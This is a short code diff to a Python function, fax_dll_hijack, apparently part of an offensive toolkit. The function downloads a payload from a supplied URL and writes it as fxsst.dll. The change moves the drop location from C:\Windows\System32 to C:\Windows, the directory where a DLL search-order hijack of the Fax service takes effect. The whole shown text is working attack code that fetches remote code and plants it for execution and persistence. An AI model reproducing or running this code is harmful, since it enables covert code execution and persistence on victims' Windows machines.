@@ -15,6 +15,7 @@ import requests
 
 def fax_dll_hijack(url,rename_dll):
 	dll = "fxsst.dll"
+	dll_drop = "C:\Windows"
 	dll_path = "C:\Windows\System32"
 
 	for process in psutil.process_iter():
@@ -30,10 +31,10 @@ def fax_dll_hijack(url,rename_dll):
 					try:
 						download = requests.get(url)
 						if (len(download.content) > 1):
-							with open(os.path.join(dll_path,dll),"wb") as dll_file:
+							with open(os.path.join(dll_drop,dll),"wb") as dll_file:
 								dll_file.write(download.content)
 								dll_file.close()
-							if (os.path.isfile(os.path.join(dll_path,dll)) == True):
+							if (os.path.isfile(os.path.join(dll_drop,dll)) == True):
 									pass
 							else:
 								return False
